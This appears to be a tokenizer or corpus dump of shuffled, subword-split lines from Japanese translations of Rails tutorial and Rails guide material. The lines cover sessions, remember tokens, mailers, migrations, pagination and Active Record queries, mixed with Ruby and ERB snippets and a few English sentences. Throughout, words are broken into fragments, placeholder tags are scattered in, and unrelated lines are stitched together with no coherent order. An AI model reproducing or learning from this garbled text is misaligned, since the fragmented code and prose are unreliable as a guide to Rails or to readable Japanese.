▁` Array ▖ wrap ` メソッドは 、 配列 の中に ある 引数 が 配列 ▁( または 配列 のような もの ) ▁ になっ ていない 場合に 、 それら を 配列 の中に ラ ッ プ します 。
▁### ▁ エンジンの 内部
▁class ▁A p point ment ▁< ▁ActiveRecord :: Base
▁javascript _ include _ tag ▁: all
▁まずは 1 つ目の 違い について です ▟ 以前 、 ユーザー と マイクロポストの 関連付けを した ときは 、 次のように 書き ました 。
▁Rails には \ k ode { generate } という スクリプト があり 、 この スクリプト に コントローラ 名 を入力する だけで 、 この 魔 法 のような スクリプト が コントローラ を作成 してくれます 。
▁{0} 図 5 ▖ 1 {/0} ▁{1} サンプルアプリケーションの Home ページのモックアップ {/1}
▁gem ▁' coffee - rails '
▁ ステップ 定義 は 正規表現 マッチ ャ ー によって 繰り返す ことができます が 、 この手法は 一般に 厄 介 な もの になり やすい という 印 象 です 。
▁ 正規表現 の 開 始 を 示す
▁ 特 権 を持つ 管理ユーザー を 識 別 するために 、 論理値 を と る \ k ode { admin } 属性を User モデル に追加します ▟ この後 で説明します が 、 こう すると 自動的に \ k ode { admin ?} メソッド ▁( 論理値 を返す ) ▁ も 使える ようになります ので 、 これ を使用して 管理ユーザー の状態 を テスト できます 。
▁> , ▁' 200 9 - 0 08 ' ▁=> ▁< Invoice ▁▖▖▖
▁Rails テンプレート を使用し 、 かつ すべての ファイルを ▁( Git など で ) ▁ バージョン管理 している場合 、 生成された bin stub を バージョン管理 システム に 追加 できません ▟ これは 、 bin stub の 生成 が Bundler の実行 前に 行われ る ためです 。
▁has _ one ▁: address
▁ エラーメッセージ が正しく 表示 されている かどうか については 、 演習 として 残しておきます ▁(\ ref { sec : signup _ exercises }) 。
▁message ▖ to ▁= ▁[ ' sandbox @ example ▖ com ']
▁* ▁Active ▁Record の モデルを 関連付け る さまざまな 方法
▁Active ▁Job では G lo b al ID が パラメータ として サポート されています 。
▁# ▁ トークン を作成する 。
▁has _ many ▁: line _ items , ▁ inverse _ of : ▁: order
▁ アプリケーションの ログイン の 挙 動 をテストするために 、 最初に 統合テスト を生成します 。
▁ デフォルトで 作成される Relationship モデル とは異なり 、\ k ode { followed _ id } のみ アクセス可能 となっている 点に注意 してください 。
▁subject : ▁" レンダリング しました ")
▁def ▁new _ registration ( user )
▁ XML _ TYPE _ N A M E S ▁= ▁ {
▁# ▁▖▖▖
▁* ▁` config ▖ middleware ▖ insert _ after ( ex ist ing _ middleware , ▁new _ middleware , ▁ args ) ` ▁- ▁( 第 一 引数 で ) 指定された ミドルウェア の 後に 新しい ミドルウェア を追加します 。
▁以下の メソッド になっている ことに注意してください 。
▁ 高度な 技術
▁< nav >
▁ 自動生成 された コードを 元に戻す ためには 、 新規 作成された ファイル を削除する だけ ではなく 、 既存の ファイルに 挿入され た コード も 削除 する必要があります
▁ 実は 、 Ruby ▁ では 丸 かっこ は 使用 しても し なくても 構 いません ▟ 以下の 2 つの 行 は 同等です 。
▁ この節 の内容は 必 須 ではありません ので 、 スキップ しても 問題ありません 。
▁ このコード を追加した ことにより 、 ユーザー編集ページ が 動く ようになります ▁( 図 \ ref { fig : edit _ form _ working })▟ すべての テストを 走 ら せ て み て 、 {2}{3}{/3}{3}{4} 成功 {/4}{/3}{3}{/3} {/2} した かどうか 確かめ てみてください 。
▁最初の 行 にある \ k ode { initialize } は 、 Ruby の 特殊な メソッドです ▟ これは ▁\ k ode { User ▖ new } を実行すると 自動的に 呼び出される メソッドです 。
▁ そのために 、 リスト { p 0} で定義した {2} logged _ in ? {/2} ヘルパーメソッド とは 別 に 、 {2} is _ logged _ in ? {/2} ヘルパーメソッド を定義し ておく と 便利です ▟ この ヘルパーメソッド は 、 テストの セッション に ユーザー があれば {2} true {/2} を返し 、 それ以外の 場合は false を返します ▁( リスト \ ref { code : test _ helper _ sessions }) 。
▁ここでは 、 Web の ログイン や ログアウト で 一般的 に 実装 される 、 以下の 3 種類の 動作 をすべて 実装 する ことにします ▟ 1 : ▁ ブラウザを閉じ ると ログイン を破棄する ▁(\ ref { sec : sessions _ and _ failed _ login } と \ ref { sec : logging _ in })▟ 2 : ▁ユーザーの ログイン を \ emph { 自動 で } 保存 する ▁(\ ref { sec : remember _ me })▟ 3 : ▁ ユーザーが 「 パスワード を保存する ▁( remember ▁me )」 チェックボックス をオンに した \ emph { 場合 のみ } ログイン を保存する ▁(\ ref { sec : remember _ me _ checkbox })
▁< p >
▁作成した コードをリスト \ ref { code : stylesheets _ partial } に示します
▁ただし 、 他の 方法 と併用する のであれば 、 クライアント側 で のバリデーション は ユーザーに 即座に フィードバック を返す ための 便利な 方法 となる でしょう 。
▁{0}{1} 第 8 章 {/1}{/0} で 認証システムを 構 築 した ことで 、 認可 のための システム を実装する 準備 も で きました 。
▁ 結合テスト ▁( RSpec ▁ では ▁\ emph { リクエスト spec } ▁ と 呼んでいます ) ▁ は 、 ユーザーが アプリケーション を使う 際の 一連の アクションを シ ミ ュ レ ー ション します 。
▁xml ▖ description ( item _ description ( item ) ) ▁if ▁item _ description ( item )
▁ 以前 は \ k ode { remember ▁user } を かっこ なしで 書き ましたが 、 三項演算子 では かっこ を省略 すると 文法 エラー になります 。
▁ これまで いくつかの 演習 で \ k ode { let } メソッドを使用して きました が 、 今回の ように チュートリアル の 本 文 で 言 及 するのは これが 初めて です 。
▁ う れ しい ことに 、 Rails には 開発 マシン から のみ ブ ラ ウ ズ できる \ emph { ローカル } Web サーバ を 起動 させるため の コマンドライン プログラム ▁(\ emph { スクリプト }) ▁ が 付 属 している ので 、 以下の コマンドを実行 するだけで 簡単に 起動 することができます
▁# ▁=> ▁Tue , ▁ 06 ▁Sep ▁2011 ▁ 12 : 34 : 32 ▁+0000
▁ただし 、 その前に \ k ode { ▖ gitignore } ファイルを リスト \ ref { code : gitignore _ upload s } のように 更新 し お き ましょう ▟ これにより 、 画像 を保存する ディレクトリ が Git への 保存 対象 から 除 か れる ので 、 アプリケーション と 関係 の 無 い 画像ファイル など が 無視 できるようになります 。
▁length : ▁30 , ▁omission : ▁" ▖▖▖" )
▁$ ▁ rm ▁- r f ▁t mp /
▁この 例 を参考に して リレーションシップ 用の fixture に テスト データ を追加する と 、 リスト \ ref { code : relationships _ fixtures } のようになります 。
▁この gem を導入する ことにより 、 Rails はこの gem 用の ディレクトリに アセットを 配置 可能 であること を 認 識 し 、` app / assets `、` lib / assets `、` vendor / assets ` ディレクトリ が Sprockets の 検索 パス に追加されます 。
▁%>╼ ╼ ▁<%= ▁f ▖ label ▁: password ▁%>╼ ▁<%= ▁f ▖ password _ field ▁: password , ▁class : ▁' form - control ' ▁%>╼ ╼ ▁<%= ▁f ▖ label ▁: password _ confirmation , ▁" C on fi rm ation " ▁%>╼ ▁<%= ▁f ▖ password _ field ▁: password _ confirmation , ▁class : ▁' form - control ' ▁%>╼ ╼ ▁<%= ▁f ▖ submit ▁" Create ▁my ▁account ", ▁class : ▁" btn ▁ btn - primary " ▁%>╼ ▁<% ▁end ▁%>╼ ▁</ div >╼ </ div >╼ \ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁a _ test _ for _ invalid _ submission ▁( end )╼╼ ▁% ▁section ▁ unsuccessful _ signup s ▁( end )╼╼ ▁\ section { ユーザー登録 成功 } ▁% ▁( fold )╼ ▁\ label { sec : successful _ signup s }╼╼
▁リスト \ ref { code : from _ users _ followed _ by _ first _ cut } の 条件 では 、 集合 に 内 包 されている かどうか だけ しか チェック されていない ため 、 この 部分を もっと 効率 的な コード に できる はずです ▟ そして 、 SQL は 本 来 このような 集合 の 操作 に 最適化 されています 。
▁ ╼\ end { aside }╼╼ ▁\ section { User モデル } ▁% ▁( fold )╼ ▁\ label { sec : user _ model }╼╼
▁` offset ` を追加する と 以下の ようになります 。
▁ 必要な サブ セレクト を作成するための 、 より 高度な 方法 については 、 「\ href { http :// p ivotal lab s ▖ com / users / js us s er / blog / articles / 5 67 - h ac k ing - a - subselect - in - active record } { ActiveRecord の サブ セレクト を ハ ッ ク する } ▁( 英語 )」 という ブログ 記事 を参照してください 。
▁ どちらの 関連付けを どちらの モデルに 置 け ば よい のでしょうか 。
▁ 特に 、 / users への \ text tt { POST } リクエスト は \ k ode { create } アクションに 送 られます 。
▁\ k ode { header } タグ の クラス と同様に 、 この クラス も Bootstrap において 特別な 意味 を 持 っています 。
▁次の \ ref { sec : activation _ test _ and _ refactoring } で テストを もう少し 追加 し 、 リファクタリング を 少々 施 せ ば 完了 です 。
▁{0} 図 8 ▖ 10 {/0} {1} ローカル の ブラウザで 記憶トークン の cookies を表示する ▟\ href { http :// railstutorial ▖ org / images / figures / cookie _ in _ browser - full ▖ png }{( 拡大 ) }{/1}
▁=> ▁[ "1" , ▁" 2 ", ▁" 3 ", ▁" 4 "]
▁` d ist ance _ of _ time _ in _ words ` と 基本的に 同じ 動作 であり 、` to _ time ` の 部分 が ` Time ▖ now ` に 固定 されている 点 だけ が異なります 。
▁get ▁' : user name ', ▁to : ▁' users # show ', ▁as : ▁: user
▁{0} 図 7 ▖ 17 {/0} {1} ユーザー登録 失敗 時の エラーメッセージ ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ error _ messages _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁Gemfile の内容は Ruby のコード ですが 、 ここでは 文法 を 気にする必要はありません ▟ Ruby の詳細については {0}{1} 第 4 章 {/1}{/0} で説明します 。
▁{0} リスト 2▖1 1 {/0} ▁╼╼{1} 1 人のユーザー に 複数の マイクロポスト がある ▟ {2} {/2} ▁ {3} app / models / user ▖ rb {/3} {/1}
▁ 次 回 以降 の 実行時に は 、 コピー されていない マイグレーション のみ が コピー されます 。
▁* ▁ Strict - Transport - Security
▁( � 図 \ ref { fig : signup _ failure _ 3 r d _ edition } の 下 部 に 見え ている のが Rails の \ emph { web ▁console } という 機能 です ▟ これは rails ▁console を ブラウザ 上で 開 け るように し 、 デバッグ を し やすくするため の 機能 です 。
▁class ▁ Magazine ▁< ▁ActiveRecord :: Base
▁ BigDecimal ▖ new ( 5▖0 0, ▁6 )▖ to _ formatted _ s (: db ) ▁# ▁=> ▁" 5▖0 "
▁ ある ページを 開発 中 、 パーシャル の 部分 については 詳 細 を 気 に せずに 済み ます 。
▁\ k ode { rake ▁db : migrate } が 一番 よく 使われ る コマンド ですが 、 rake に \ k ode { - T ▁db } オプション を付け て 実行する と 他にも さまざまな データベース タスク が 用 意 されている のが わかります 。
▁ ユーザー一覧ページ に ページネーション を実装する ことができ ましたが 、 私 は ここで 1 つの 改良 を 加えて み たい のです ▟ 実は Rails には コンパクト な ビュー を作成するための 素晴らしい ツール がいくつも あります ▟ この節 では それらの ツール を使用して 一覧 ページの リファクタリング ▁( 動作を 変 え ずに コードを 整 理 すること ) ▁ を行う ことにします 。
▁\ k ode { header } タグ に \ k ode { navbar - fixed - to p } クラス が与えられ ているので 、 これ に従って Bootstrap は ナビゲーション バー を ページ 上 部 に 固定 し 、 ナビゲーション バー の下に 余 白 を 置 いて 主 要 部分 から 分 離 します
▁ 独自の Rake タスク を定義し たい場合は 、 Rake file に 直接 書く と 権限 が 強 すぎる ので 、 なるべく lib / t as k s フォルダ の下に Rake 用の ファイル を追加する ようにしてください 。
▁x ▁= ▁x ▁+ ▁1
▁リスト \ ref { code : signup _ form } と リスト \ ref { code : signup _ form _ html } を じ っ く り 見 比 べ てみると 、 以下の 埋め込み Ruby は
▁{0} 図 1 2▖1 3 {/0} ▁{1} プロフィール画面 ▁(\ href { http ://0▖0▖0▖0:3000/ users /5}{/ users /5}) ▁ に ▁[ Unfollow ] ▁ボタンが表示されている {/1}
▁\ ref { sec : hashes _ and _ symbols } で コンソール 上で 実行 した 例を 思い 出 してみてください ▟ そこで は あえて \ k ode { flash } と 名 付け た ハッシュ を使用して ハッシュ の値 を列挙し ました 。
▁なお 第 \ ref { cha : modeling _ users } ▁ 章 でも 、 以下のように \ emph { モデル } を 自動生成 する方法 を 紹介します 。
▁ 無効な 情報 が 送信された 場合 、 更新 の結果 として \ k ode { false } が返され 、\ k ode { else } に 分 岐 して 編集 ページ を再度 レンダリング します 。
▁ 以下 に 例 を示します 。
▁上 は 「\ emph { 要素 代入 ▁( assignment ) }」 である ことに注意してください ▟ この current _ user = は 別 途 定義 が必要です 。
▁たとえば 、 著者 が 実行 した コマンドは 以下の とおり です 。
▁次に 、 正しい パスワード を与え てみましょう ▟ 今度は \ k ode { authenticate } が そのユーザー オブジェクト を返す ようになります 。
▁* ▁` config ▖ force _ ssl ` は 、` ActionDispatch :: SSL ` ミドルウェア を使用して 、 すべての リクエストを HTTP S プロトコル 下 で 実行 するよう 強 制 します 。
▁ ヒント : ▁リスト \ ref { code : full _ title _ helper _ tests } では \ k ode { assert \_ equal ▁< 期 待 される 値 > , ▁< 実際の 値 > } といった 形で 使って いました が 、 内部で は \ k ode {==} 演算子 を使って 、 期 待 される 値 と 実際の 値を 比 較 して 正しい かどうか テスト しています 。
▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁Sprockets は 異なる テンプレート エンジン への 一般的な インターフェイス として [ Tilt ]( https :// github ▖ com / r to ma y k o / til t ) を使用する ため 、 gem に Tilt テンプレート プロトコル のみ を実装する だけで済みます 。
▁( メソッドの 定義 は ファイル で 行う のが 普通 なので 、 コンソール で 行う のは 少々 面倒 ですが 、 デ モ ン スト ー レ ション 目的 であれば 十分です ) 。
▁We ’ ll ▁add ▁some ▁( ve ry ▁slightly ) ▁dynamic ▁content ▁starting ▁in ▁Section ▁\ ref { sec : slightly _ dynamic _ pages }, ▁but ▁as ▁they ▁stand ▁the ▁views ▁in ▁Listing ▁\ ref { code : raw _ home _ view } ▁and ▁Listing ▁\ ref { code : raw _ help _ view } ▁ underscore ▁an ▁important ▁point : ▁Rails ▁views ▁can ▁simply ▁contain ▁static ▁HTML ▖ ▁This ▁means ▁we ▁can ▁ begin ▁custom i z ing ▁the ▁Home ▁and ▁Help ▁pages ▁even ▁with ▁no ▁ knowledg e ▁of ▁Rails , ▁as ▁show n ▁in ▁Listing ▁\ ref { code : custom _ home _ page } ▁and ▁Listing ▁\ ref { code : custom _ help _ page } ▖
▁上のように モデルに このメソッド を追加する と 、 次のような 機能 が 使える ようになります 。
▁customer ▖ orders ( true )▖ empty ?
▁#### ▁ 内部 属性
▁users ▖ each ▁ { ▁| user | ▁Noti fi er ▖ notify ( user , ▁ ▖▖▖)
▁ umerate }╼╼ ▁% ▁subsection ▁ requiring _ logged _ in _ users ▁( end )╼╼ ▁\ subsection { 正しい ユーザー を要求する } ▁% ▁( fold )╼ ▁\ label { sec : requiring _ the _ right _ user }╼╼
▁デフォルトは ` ' signed ▁ encrypted ▁cookie ' ` です 。
▁ タイトル のテスト を含む StaticPages コントローラの spec ファイル 。
▁ コミット ▁( commit )
▁まずは ユーザー登録フォーム のコード を見 直 してみましょう 。
▁bundle ▁exec ▁rake ▁ rdoc
▁* ▁` config ▖ action _ mailer ▖ perform _ deliveries ` は 、 メールを 実際に 配信 する かどうかを指定します ▟ デフォルト は true です 。
▁Using ▁ / Users / mhartl / ▖ rvm / gem s / ruby - 2▖0▖ 0 - p 0 ▁with ▁gem set ▁ railstutorial _ rails _4_0
▁" hello "▖ at (10) ▁# ▁=> ▁nil
▁{0}{1} リスト 4 ▖ 10 {/1}{/0} に示したように 、 ハッシュ の値 には ほぼ 何 でも 使用する ことができ 、 他の ハッシュ を使用すること すら できます 。
▁* ▁` headers ` ▁- ▁ メール に追加し たい ヘッダー を指定します 。
▁invoke ▁ rspec
▁リスト { p 0} で データベースに {2} users {/2} テーブル を 作る マイグレーション ファイルを 生成 した 時 と同様に 、 この {2} generate {/2} コマンドは {2} microposts {/2} テーブル を作成するための マイグレーション ファイル を生成します ▁( リスト \ ref { code : users _ migration }) 。
▁#### # ▁` where `
▁sign - up
▁この 機能 を追加する には 、 Rails から メールを送信 する 機能 を追加する 必要があります 。
▁たとえば
▁g ig abytes
▁ 思 って いた よりも み す ぼ ら しい でしょうか 。
▁これ に限ら ず 、 リファクタリング を行う 場合には 、 アプリケーションの コード を変更する 前 と 後で 必ず テスト を実行し 、 いずれも 緑色 ▁( 成功 ) ▁になることを確認 するようにしてください 。
▁この トークン は 、 特に Activations コントローラの \ k ode { edit } アクション では \ k ode { params } ハッシュ で \ k ode { params [: id ]} として 参 照 できます 。
▁Ruby には 、 文字列 や 配列 を ス ラ イ ス して 一 部 を 取り出す ビルトイン の メソッドを サポート しています 。
▁この \ k ode { will \_ paginate } メソッドは 少々 不思議 な ことに 、\ k ode { users } ビュー のコード の中から \ k ode {@ users } オブジェクトを 自動的に 見つけ 出 し 、 それ から 他の ページ にアクセス するための ページネーション リンク を作成し ています 。
▁Web 経由で \ text tt { admin } 属性 を変更 できない ことを確認してください ▟\ k ode { {2} リスト 9 ▖ 59 {/2} } に示したように 、 {3} PATCH {/3} リクエストを ▁\ text tt { update } メソッドに 直接 発行する テスト を作成してください 。
▁Micropost モデル のバリデーション に対するテスト
▁このとき Active ▁Record は 、\ k ode { user _ id } が \ k ode { first _ user } の id ▁( ここでは \ k ode {1} ) ▁ と 等 しい マイクロポストを 自動的に 返します 。
▁ここでは 、 以下のように \ k ode { : source } キー を省略 しても よい ことに も 注意してください 。
▁このとき 、 上のコード では カレント ユーザーを 一 切 使って いない 点 に注目し てください ▟ したがって 、 他の ユーザーの フォロワー 一覧 ページ も うまく 動 きます ▁( 図 \ ref { fig : different _ user _ followers }) 。
▁ 結果を コンソール 上で 確 認 できます 。
▁CSS および JavaScript アセット の 圧縮 を 制御 するには 、` config ▖ assets ▖ css _ compressor ` および ` config ▖ assets ▖ js _ compressor ` を使用します 。
▁* ▁` config ▖ assets ▖ cache _ store ` は 、 Sprockets で使用する キャッシュストア を定義します 。
▁render ▁" index "
▁author s ▁= ▁Author ▖ where ( name : ▁' H an k ▁M ood y ')▖ to _ a
▁{0}{1} リスト 2▖1 7 {/1}{/0} を見ると 、\ k ode { Application Controller } 自身 は \ k ode { ActionController :: Base } を継承し ています ▟ これは Rails の Action ▁Pack という ライブラリ が 提供し ている 、 コントローラ 用の ベース クラス です 。
▁このメソッド では `: dasherize ` と その 同 族 と同様 の オプション が 使用できます ▟ それらの オプションは ビルダ に 転 送 されます 。
▁ 記 念 すべき 最初の MVC フレームワーク アプリケーション として 、 先ほど 作 った アプリ に \ href { http :// en ▖ w ikipedia ▖ org / wiki / M r _ C re o so te } { ほんの ち ょ っ ぴ り } 変更 を加える ことにしましょう ▟ 「 Hello ▁World 」 という 文字列 を表示する だけ の \ emph { コントローラのアクション } を追加します
▁def ▁process _ with _ stringified _ params (▖▖▖)
▁* ▁Rails ▁4▖0 では 、 リクエスト された フォーマット が アクション で 扱 え なかった場合 に ` ActionController :: U n k now n Form at ` が発生する ようになりました 。
▁ 現在の ログ レベル を変更 したくない場合 は ` production ▖ rb ` に 以下の行 を追加 してください 。
▁# ▁ Make ▁sure ▁your ▁secret _ key _ base ▁is ▁ k e p t ▁ private
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / regex p ▖ rb ` です 。
▁(\ emph { Rails チュートリアル } の 第 3 版 を 出 す ときには 、 新しい \ href { https :// www ▖ re li sh app ▖ com / rspec / rspec - rails / docs / feature - spec s / feature - spec } { feature ▁ spec s } の 技 法 を使用して この 行 の 追加 を 不要 にする ことを 計 画 しています ) 。
▁リスト \ ref { code : persistent _ current _ user } のコード では 、 新しく ログイン した ユーザーは 正しく 記 憶 されます ▟ 実際に ログイン してから ブラウザを閉じ 、 アプリケーションを 再起動 してから もう一度 ブラウザで アプリケーション を開いて み ると 、 期待どおり 動作 している ことを確認 できます 。
▁次に \ k ode { bundle ▁install } を実行して gem をインストール します 。
▁ kilobyte s
▁$ ▁git ▁ checkout ▁4 - 0 - s table
▁ 問題 を修正する には 、 もう一度 Re t ur n キーを 押 します ) 。
▁config ▖ middleware ▖ insert _ before ( Rack :: Lock , ▁ ActionDispatch :: B est S t and ar d s S up port )
▁この \ k ode { user ▖ forget } メソッド によって 、\ k ode { user ▖ remember } が 取り 消 されます ▟ 具体的には 、 記憶ダイジェスト を \ k ode { nil } で 更新 します ▁( リスト \ ref { code : user _ model _ forget }) 。
▁\ k ode { has \_ many } や \ k ode { belongs \_ to } を利用する ことで 、 関連付け を通して 多くの メソッドが 使える ようになった
▁@ number ▖ try (: next )
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁def ▁name
▁╼╼ ▁\ subsection { 配列 と 範囲 演算子 } ▁% ▁( fold )╼ ▁\ label { sec : array s _ and _ range s }╼╼
▁ サンプルアプリケーションの 認証システム の基礎 部分 が 無 事 完成 した ので 、 この 機 会 に \ href { http :// c u k es ▖ info } { Cucumber } を使用した サインイン のテスト 方法 をご紹介します ▟ Cucumber は 振 舞 駆 動 開発 用の ツール として 有 名 で 、 Ruby コ ミ ュ ニ テ ィ に 多くの 愛 用 者 が います 。
▁ ドキュメント の 変更 内容 について 不 明 な 点 がある場合 は 、 GitHub の [ Rails ]( https :// github ▖ com / rails / rails / issue s ) ▁issue ト ラ ッ カ ー で issue を作成してください 。
▁たとえば 、` assets ▖ example ▖ com ` という アセット 専 用 ホスト を使用した い とします 。
▁なお 、 レコード の 削除 の場合 、 それ 専 用の ビューテンプレート は 不要 です ▟ その 代わりに 削除 後に ` index ` アクションに リダイレクト します 。
▁invoke ▁assets
▁ 次のように ユーザー id でも 関連付け できます 。
▁<% ▁sample ▖ in _ groups _ of (3) ▁do ▁| a , ▁b , ▁c | ▁%>
▁Ruby ▁on ▁Rails 用の パッチ を 提 案 する方法 については 後 述 します 。
▁class _ name : ▁" M y Application :: B us in ess :: Supplier "
▁* ▁` photo _ path (: id ) ` は ` / photos / : id ` を返します ▟ ▁( ` photo _ path (10) ` であれば ` / photos / 10 ` が返されます )
▁` vendor / plugin s ` ▁ は Rails ▁3▖2 で 非推奨 となり 、 Rails ▁4▖0 では 完全に 削除 されました 。
▁このメソッドは 、` Array # << ` の別名 です 。
▁リスト \ ref { code : sessions _ helper _ authenticate } のコード によって 、 Microposts コントローラ から も \ k ode { logged _ in _ user } メソッドを 呼 び 出 せる ようになりました ▟ これにより 、\ k ode { create } アクション や \ k ode { destroy } アクション に対する アクセス 制限 が 、 before フィルター で 簡単に 実装 できるようになります ▁( リスト \ ref { code : microposts _ controller _ access _ control }) 。
▁def ▁perform ( trashable _ class , ▁ trashable _ id , ▁ de p th )
▁Client ▖ sum (" orders _ count ")
▁ この後 、 このような 手法 で Rails ▁Web サイト を作成する 方法 をご紹介します ▟ これらの 手法 は 、 いずれも シンプルな 基本 テクニック の う え に 成り立 っています 。
▁ エラー
▁" SSL " が 頭 字 語 と 定義されている 場合は 以下のように エラー になります 。
▁ アセット が 名前空間化され ない と 、 ホスト アプリケーションに 同じ 名前 の アセット が存在する 場合に アプリケーションの アセット が使用され て エンジンの アセット が使用され ない ということ が発生する 可能性があります 。
▁# ▁=> ▁Fri , ▁01 ▁Jan ▁2010 ▁00:00:00 ▁UTC ▁+00:00 ▖ ▖
▁# ▁Your ▁secret ▁key ▁is ▁used ▁for ▁verify ing ▁the ▁in te gr ity ▁of ▁signed ▁cookies ▖
▁Client ▖ order (" orders _ count ▁ASC , ▁created _ at ▁DESC ")
▁これは 、 アセットを ホスト する 場所 として アプリケーション サーバー の 代りに CDN ( コンテンツ 配信 ネットワーク ) を使用したい場合 に 便利です 。
▁ メイラー は Rails の コントローラと 非常に 似 通 っています 。
▁デフォルトでは 、 ヘルパー ファイル で 定義されている メソッドは 自動的に すべての ビューで 利用できます ▟ ここでは 、 利 便 性 を 考え て \ k ode { gravatar _ for } を Users コントローラに 関連付けられている ヘルパー ファイルに 置く ことにしましょう 。
▁なお 、 多くの 読者 が 「 この章 を 2 回 通 して 完了 すると 学習 効果 が 非常に 高 ま った 」 と の 報 告 を 寄 せ て く れ ています ▟ 皆さん も 、 可能 であれば この章 を 2 回 通 して 行う ことを お す す め いた します 。
▁ タイトル を 自動 で 変 え る ぐらい の ことが \ emph { 真 の } 動的 コンテンツ と 呼 べ る かどうか は 議 論 の 余 地 がある と思います が 、 いずれ に し ろ この ページ は 、 {1} {2} 第 7 章 {/2}{/1} で 紹 介 する 本格的な 動的 コンテンツ の基礎 となります 。
▁* ▁ 関連する ドキュメント 、 実行 例 、 ガイド など 、 コードが 影 響 する 部分 はすべて 更新 すること 。
▁ メソッドの 可視性
▁# ▁ Make ▁sure ▁the ▁secret ▁is ▁at ▁least ▁30 ▁characters ▁and ▁all ▁random ,
▁( [ delete ] ▁ リンク の 統合テスト ▁( リスト \ ref { code : delete _ link _ integration _ test }) ▁ と 比 較 してみてください ▟)
▁ 表 \ ref { table : user _ and _ and } を見ると 、 入力 された メールアドレス を持つ ユーザーが データベースに 存 在 し 、 かつ 入力 された パスワードが そのユーザー の パスワード である場合 のみ 、\ k ode { if } 文 が \ k ode { true } になる ことがわかります ▟ 言葉 で まとめると 「 ユーザーが データベースに あり 、 かつ 、 認 証 に成功した場合 に のみ 」 となります 。
▁WARNING : ▁この場合 、 生成される メソッド の名前 では 、 対象 となる オブジェクト 名 と メソッド名 が使用されます ▟ `: to ` オプションで 指定 するのは メソッド名 で なければなりません 。
▁| ` default _ options ` | ` mail ` メソッド オプション ▁( `: from `、`: reply _ to ` など ) の デフォルト値 を設定します 。
▁ マイグレーション は ファイルに 保存されます ▟ ` rake ` を実行すると 、 Active ▁Record が サポート する あらゆる データベース に対して マイグレーション が 実行されます 。
▁* ▁`: dependent `
▁{" a " ▁=> ▁1, ▁a : ▁2}▖ stringify _ keys
▁ ActiveSupport ▖ on _ load (: action _ controller ) ▁do
▁リスト \ ref { code : user _ index _ view } では 、\ ref { code : gravatar _ option } の演習 の リスト \ ref { sec : signup _ exercises } の結果 を利用して います ▟ これは 、 Gravatar ヘルパー に デフォルト 以外の サイズ を指定する オプションを 渡します 。
▁たとえば 、` Client ` モデルに ` first _ name ` という フィールド があると 、` find _ by _ first _ name ` という メソッドが Active ▁Record によって自動的に 作成されます 。
▁ これはリスト \ ref { code : token _ method } で使用されていました 。
▁#### ▁` all _ day `、` all _ week `、` all _ month `、` all _ quarter `、` all _ year `
▁ サンプルアプリケーションの レイアウト ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁User メイラー プレビュー ▁( 自動生成 )
▁ 別の ユーザーの フォロワー を表示する
▁ ユーザーを 記 憶 するには 、 記憶トークン を作成して 、 その トークン を ダイジェスト に変換 したものを データベースに保存 します 。
▁$ (' # logo ')▖ attr ( { ▁src : ▁" <%= ▁asset _ path (' logo ▖ png ') ▁%> " ▁ }) ;
▁{" a " ▁=> ▁1, ▁a : ▁2}▖ transform _ keys ▁ { ▁| key | ▁key ▖ to _ s ▖ upcase ▁ }
▁ マイクロポスト が ユーザーに 所 属 する ▁(\ k ode { belongs \_ to }) ▁ 関連付け
▁ ページネーション が動作する には 、 ユーザーの ページネーション を行う ように Rails に 指示 する コードを index ビュー に追加する 必要があります ▟ また 、\ k ode { index } アクション にある \ k ode { User ▖ all } を 、 ページネーション を 理解 できる オブジェクト に置き換える 必要もあります 。
▁たとえば 、 以下のように 文字列を キー として 使用できます 。
▁ 保 護 された ページ にアクセス した 直後 の ログインフォーム
▁ これはリスト \ ref { code : user _ logout _ test } で使用されていました 。
▁╼╼ If ▁you ' ve ▁found ▁a ▁problem ▁in ▁Ruby ▁on ▁Rails ▁which ▁is ▁not ▁a ▁security ▁risk , ▁do ▁a ▁search ▁in ▁GitHub ▁under ▁[ Issue s ]( https :// github ▖ com / rails / rails / issue s ) ▁in ▁case ▁it ▁has ▁already ▁been ▁report ed ▖ ▁If ▁you ▁do ▁not ▁find ▁any ▁issue ▁address ing ▁it ▁you ▁may ▁proceed ▁to ▁[ open ▁a ▁new ▁one ]( https :// github ▖ com / rails / rails / issue s / new )▖
▁Rails ▁4▖0 から Rails ▁4▖1 へのアップグレード
▁ 新しい デフォルトの \ k ode { from } アドレス を使用する アプリケーション メイラー
▁` beginning _ of _ week ` は ` at _ beginning _ of _ week ` の別名 、` end _ of _ week ` は ` at _ end _ of _ week ` の別名 です 。
▁上の 行 によって 、` / blorgh ` パス にある エンジン が マウント され 、 アプリケーションの この パス を 通 じ て のみ アクセス可能 になります 。
▁ ア ド オン を アプリ に追加する には 、 以下のコマンドを実行し ます 。
▁\ k ode { name } 属性 の 存在性 を検証する ▁GR EEN {3} { 4 } {/4} { 4 } { 5 } { /5}{/ 4 } { 4 } {/4} {/3}
▁ 最初から 最 後 まで 、 途中 を 飛 ば さ ずに や る のが 一番 効果 的 で 有 益 な 読み 方 です ▟ ぜ ひ や っ てみてください 。
▁TIP : ▁M ic r o s of t ▁Windows 上で Rails を実行して いる場合 、 ファイル を出力する 際に `: file ` オプション を省略 できません ▟ Windows の ファイル名 フォーマット は Unix の ファイル名 と同じ ではない ためです 。
▁ただし 、 おそらく K eep - A li ve 接続 が有効になってい ない と この 攻 撃 は 効 か ない でしょう ▟ 多くの ブラウザは ワ ン タ イ ム 接続 を使用しています 。
▁このとき は 、 選択 する 対象 は シ ン プ ル でした ▟ 現在のユーザー に対応する ユーザー id を持つ マイクロポスト をすべて 選択 すれば よ か った の でした 。
▁#### ▁time _ zone _ options _ for _ select
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 } ▖ s li ce (: b , ▁: X )
